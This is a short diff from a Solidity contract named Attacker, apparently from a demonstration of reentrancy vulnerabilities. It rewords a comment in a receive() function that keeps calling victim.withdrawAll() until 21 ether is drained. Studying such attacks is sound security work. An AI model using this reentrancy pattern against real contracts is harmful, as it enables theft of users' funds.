@@ -32,8 +32,7 @@ contract Attacker {
 
     receive() external payable {
         counter++;
-
-        // The attacker only drains 21 ether.
+        // The attacker drains 21 ether.
         if(counter < 21) {               
             victim.withdrawAll();
         }
